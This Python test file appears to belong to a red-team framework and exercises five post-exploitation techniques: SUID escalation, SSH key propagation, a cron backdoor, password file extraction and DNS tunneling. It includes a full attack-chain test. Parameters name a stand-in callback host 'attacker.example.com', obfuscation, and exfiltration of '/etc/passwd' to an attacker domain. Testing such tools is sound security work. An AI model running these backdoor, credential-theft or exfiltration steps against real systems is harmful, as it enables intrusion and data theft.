"""
Unit tests for post-exploitation techniques.

Tests all 5 core post-exploitation techniques:
1. Linux SUID Abuse (Privilege Escalation)
2. SSH Key Propagation (Lateral Movement)
3. Cron Backdoor (Persistence)
4. Password File Extraction (Credential Harvesting)
5. DNS Tunneling (Data Exfiltration)
"""

import pytest
from typing import Dict, Any

from . import (
    LinuxSUIDAbuse,
    SSHKeyPropagation,
    CronBackdoor,
    PasswordFileExtraction,
    DNSTunneling,
    PostExploitStatus,
    PostExploitCategory,
)


class TestLinuxSUIDAbuse:
    """Tests for SUID privilege escalation technique."""

    @pytest.mark.asyncio
    async def test_suid_abuse_success(self):
        """Test successful SUID escalation."""
        technique = LinuxSUIDAbuse()
        
        result = await technique.execute(
            target="test_container_001",
            credentials={"user": "testuser", "privilege": "user"}
        )

        # Assertions
        assert result.success is True
        assert result.status == PostExploitStatus.SUCCESS
        assert result.category == PostExploitCategory.PRIVILEGE_ESCALATION
        assert result.technique_id == "PRIVESC-LINUX-SUID-001"
        assert result.risk_score > 0.7
        assert "suid_binary" in result.artifacts
        assert "root_shell" in result.artifacts
        assert len(result.evidence) > 0

    @pytest.mark.asyncio
    async def test_suid_abuse_metadata(self):
        """Test SUID technique metadata."""
        technique = LinuxSUIDAbuse()
        
        metadata = technique.get_metadata()

        assert metadata["technique_id"] == "PRIVESC-LINUX-SUID-001"
        assert metadata["name"] == "SUID Binary Abuse"
        assert metadata["category"] == "privilege_escalation"
        assert "linux" in metadata["os_targets"]
        assert metadata["privilege_required"] == "user"
        assert metadata["stealth_level"] == 6
        assert metadata["risk_level"] == 5

    @pytest.mark.asyncio
    async def test_suid_cleanup(self):
        """Test SUID cleanup process."""
        technique = LinuxSUIDAbuse()
        
        result = await technique.execute(
            target="test_container_002",
            credentials={"user": "testuser"}
        )

        # Cleanup
        cleanup_success = await technique.cleanup(
            target="test_container_002",
            artifacts=result.artifacts
        )

        assert cleanup_success is True


class TestSSHKeyPropagation:
    """Tests for SSH lateral movement technique."""

    @pytest.mark.asyncio
    async def test_ssh_propagation_success(self):
        """Test successful SSH key propagation."""
        technique = SSHKeyPropagation()
        
        result = await technique.execute(
            target="host_10.0.1.5",
            credentials={"user": "admin"},
            network_range="10.0.1.0/24",
            max_hops=3
        )

        # Assertions
        assert result.success is True
        assert result.status == PostExploitStatus.SUCCESS
        assert result.category == PostExploitCategory.LATERAL_MOVEMENT
        assert result.technique_id == "LATERAL-SSH-PROPAGATION-001"
        assert "stolen_keys" in result.artifacts
        assert "compromised_hosts" in result.artifacts
        assert result.artifacts["key_count"] > 0

    @pytest.mark.asyncio
    async def test_ssh_propagation_metadata(self):
        """Test SSH propagation metadata."""
        technique = SSHKeyPropagation()
        
        metadata = technique.get_metadata()

        assert metadata["technique_id"] == "LATERAL-SSH-PROPAGATION-001"
        assert metadata["category"] == "lateral_movement"
        assert metadata["stealth_level"] == 8
        assert metadata["risk_level"] == 3

    @pytest.mark.asyncio
    async def test_ssh_cleanup(self):
        """Test SSH connection cleanup."""
        technique = SSHKeyPropagation()
        
        result = await technique.execute(
            target="host_10.0.1.5",
            credentials={"user": "admin"}
        )

        cleanup_success = await technique.cleanup(
            target="host_10.0.1.5",
            artifacts=result.artifacts
        )

        assert cleanup_success is True


class TestCronBackdoor:
    """Tests for cron persistence technique."""

    @pytest.mark.asyncio
    async def test_cron_backdoor_success(self):
        """Test successful cron backdoor installation."""
        technique = CronBackdoor()
        
        result = await technique.execute(
            target="server_001",
            credentials={"user": "admin"},
            callback_host="attacker.example.com",
            callback_port=4444,
            timing="moderate",
            obfuscate=True
        )

        # Assertions
        assert result.success is True
        assert result.status == PostExploitStatus.SUCCESS
        assert result.category == PostExploitCategory.PERSISTENCE
        assert result.technique_id == "PERSIST-CRON-001"
        assert "hidden_directory" in result.artifacts
        assert "backdoor_script" in result.artifacts
        assert "cron_entry" in result.artifacts
        assert result.artifacts["obfuscated"] is True

    @pytest.mark.asyncio
    async def test_cron_backdoor_timing_patterns(self):
        """Test different timing patterns."""
        technique = CronBackdoor()
        
        # Test frequent timing
        result = await technique.execute(
            target="server_002",
            credentials={"user": "admin"},
            timing="frequent"
        )

        assert result.success is True
        assert "*/5 * * * *" in result.artifacts["cron_schedule"]

    @pytest.mark.asyncio
    async def test_cron_cleanup(self):
        """Test cron backdoor cleanup."""
        technique = CronBackdoor()
        
        result = await technique.execute(
            target="server_003",
            credentials={"user": "admin"}
        )

        cleanup_success = await technique.cleanup(
            target="server_003",
            artifacts=result.artifacts
        )

        assert cleanup_success is True


class TestPasswordFileExtraction:
    """Tests for password file extraction technique."""

    @pytest.mark.asyncio
    async def test_password_extraction_success(self):
        """Test successful password file extraction."""
        technique = PasswordFileExtraction()
        
        result = await technique.execute(
            target="linux_server_001",
            credentials={"user": "root", "privilege": "root"},
            crack_weak=True
        )

        # Assertions
        assert result.success is True
        assert result.status == PostExploitStatus.SUCCESS
        assert result.category == PostExploitCategory.CREDENTIAL_HARVESTING
        assert result.technique_id == "CRED-PASSWORD-FILES-001"
        assert "users" in result.artifacts
        assert "users_with_hashes" in result.artifacts
        assert result.artifacts["total_users"] > 0

    @pytest.mark.asyncio
    async def test_password_extraction_insufficient_privilege(self):
        """Test extraction failure with insufficient privileges."""
        technique = PasswordFileExtraction()
        
        result = await technique.execute(
            target="linux_server_002",
            credentials={"user": "lowpriv", "privilege": "user"}
        )

        # Should succeed but might not find shadow access
        # Based on current implementation, check for proper handling
        assert result is not None
        assert result.technique_id == "CRED-PASSWORD-FILES-001"

    @pytest.mark.asyncio
    async def test_password_extraction_metadata(self):
        """Test password extraction metadata."""
        technique = PasswordFileExtraction()
        
        metadata = technique.get_metadata()

        assert metadata["technique_id"] == "CRED-PASSWORD-FILES-001"
        assert metadata["category"] == "credential_harvesting"
        assert metadata["privilege_required"] == "root"
        assert metadata["stealth_level"] == 5


class TestDNSTunneling:
    """Tests for DNS tunneling exfiltration technique."""

    @pytest.mark.asyncio
    async def test_dns_tunneling_success(self):
        """Test successful DNS exfiltration."""
        technique = DNSTunneling()
        
        result = await technique.execute(
            target="workstation_001",
            credentials={"user": "user"},
            data_source="/etc/passwd",
            exfil_domain="exfil.attacker.example.com",
            throttle=0.5,
            encoding="base32"
        )

        # Assertions
        assert result.success is True
        assert result.status == PostExploitStatus.SUCCESS
        assert result.category == PostExploitCategory.DATA_EXFILTRATION
        assert result.technique_id == "EXFIL-DNS-TUNNEL-001"
        assert "bytes_exfiltrated" in result.artifacts
        assert "chunks_sent" in result.artifacts
        assert "session_id" in result.artifacts
        assert result.artifacts["encoding"] == "base32"

    @pytest.mark.asyncio
    async def test_dns_tunneling_different_encodings(self):
        """Test different encoding methods."""
        technique = DNSTunneling()
        
        encodings = ["base32", "base64", "hex"]
        
        for encoding in encodings:
            result = await technique.execute(
                target="workstation_002",
                credentials={"user": "user"},
                encoding=encoding
            )
            
            assert result.success is True
            assert result.artifacts["encoding"] == encoding

    @pytest.mark.asyncio
    async def test_dns_tunneling_metadata(self):
        """Test DNS tunneling metadata."""
        technique = DNSTunneling()
        
        metadata = technique.get_metadata()

        assert metadata["technique_id"] == "EXFIL-DNS-TUNNEL-001"
        assert metadata["category"] == "data_exfiltration"
        assert metadata["stealth_level"] == 9  # Very stealthy
        assert metadata["risk_level"] == 2    # Low risk

    @pytest.mark.asyncio
    async def test_dns_cleanup(self):
        """Test DNS exfiltration cleanup."""
        technique = DNSTunneling()
        
        result = await technique.execute(
            target="workstation_003",
            credentials={"user": "user"}
        )

        cleanup_success = await technique.cleanup(
            target="workstation_003",
            artifacts=result.artifacts
        )

        assert cleanup_success is True


class TestPostExploitIntegration:
    """Integration tests for post-exploitation module."""

    @pytest.mark.asyncio
    async def test_full_attack_chain(self):
        """Test complete attack chain: escalate -> lateral -> persist -> exfil."""
        
        # Step 1: Privilege Escalation
        privesc = LinuxSUIDAbuse()
        privesc_result = await privesc.execute(
            target="initial_host",
            credentials={"user": "lowpriv"}
        )
        assert privesc_result.success is True

        # Step 2: Lateral Movement
        lateral = SSHKeyPropagation()
        lateral_result = await lateral.execute(
            target="initial_host",
            credentials={"user": "root"}  # After escalation
        )
        assert lateral_result.success is True

        # Step 3: Persistence
        persist = CronBackdoor()
        persist_result = await persist.execute(
            target="initial_host",
            credentials={"user": "root"}
        )
        assert persist_result.success is True

        # Step 4: Data Exfiltration
        exfil = DNSTunneling()
        exfil_result = await exfil.execute(
            target="initial_host",
            credentials={"user": "root"}
        )
        assert exfil_result.success is True

        # Verify chain completed
        assert all([
            privesc_result.success,
            lateral_result.success,
            persist_result.success,
            exfil_result.success
        ])

    @pytest.mark.asyncio
    async def test_technique_evidence_tracking(self):
        """Test that all techniques track forensic evidence."""
        techniques = [
            LinuxSUIDAbuse(),
            SSHKeyPropagation(),
            CronBackdoor(),
            PasswordFileExtraction(),
            DNSTunneling(),
        ]

        for technique in techniques:
            result = await technique.execute(
                target="test_host",
                credentials={"user": "root", "privilege": "root"}
            )

            # All techniques must track evidence
            assert len(result.evidence) > 0
            assert result.technique_id in result.evidence[0]

    @pytest.mark.asyncio
    async def test_all_techniques_have_cleanup(self):
        """Test that all techniques implement cleanup."""
        techniques = [
            LinuxSUIDAbuse(),
            SSHKeyPropagation(),
            CronBackdoor(),
            PasswordFileExtraction(),
            DNSTunneling(),
        ]

        for technique in techniques:
            result = await technique.execute(
                target="test_host",
                credentials={"user": "root", "privilege": "root"}
            )

            # Cleanup must be implemented
            cleanup_result = await technique.cleanup(
                target="test_host",
                artifacts=result.artifacts
            )

            assert cleanup_result is not None
            assert isinstance(cleanup_result, bool)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
